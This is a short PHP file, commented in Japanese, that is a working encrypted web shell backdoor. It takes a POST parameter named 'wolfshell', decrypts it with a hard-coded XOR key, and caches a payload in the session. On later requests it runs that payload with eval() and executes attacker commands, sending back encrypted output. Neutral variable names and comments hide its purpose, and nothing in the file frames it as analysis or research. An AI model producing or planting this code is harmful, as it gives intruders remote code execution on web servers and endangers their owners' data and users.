<?php
@session_start(); // セッションを開始します
@set_time_limit(0);
@error_reporting(0); // エラー報告を無効にする
function processDataStream($inputString,$secretKey){
    // 文字列を処理するループ
    for($counter=0;$counter<strlen($inputString);$counter++) {
        $charKey = $secretKey[$counter+1&15]; // 文字キーを取得
        $inputString[$counter] = $inputString[$counter]^$charKey;
    }
    return $inputString; // 結果を返す
}
$accessKey='wolfshell';
$storageIdentifier='payload'; // ストレージ識別子
$encryptionSecret='3c6e0b8a9c15224a';
if (isset($_POST[$accessKey])){
    $incomingData=processDataStream(base64_decode($_POST[$accessKey]),$encryptionSecret);
    if (isset($_SESSION[$storageIdentifier])){
        $storedPayload=processDataStream($_SESSION[$storageIdentifier],$encryptionSecret); // ペイロードを読み込む
        if (strpos($storedPayload,"getBasicsInfo")===false){
            $storedPayload=processDataStream($storedPayload,$encryptionSecret);
        }
		eval($storedPayload); // コードを実行
        echo substr(md5($accessKey.$encryptionSecret),0,16);
        echo base64_encode(processDataStream(@run($incomingData),$encryptionSecret)); // 応答を送信
        echo substr(md5($accessKey.$encryptionSecret),16);
    }else{
        if (strpos($incomingData,"getBasicsInfo")!==false){
            $_SESSION[$storageIdentifier]=processDataStream($incomingData,$encryptionSecret); // セッションに保存
        }
    }
}
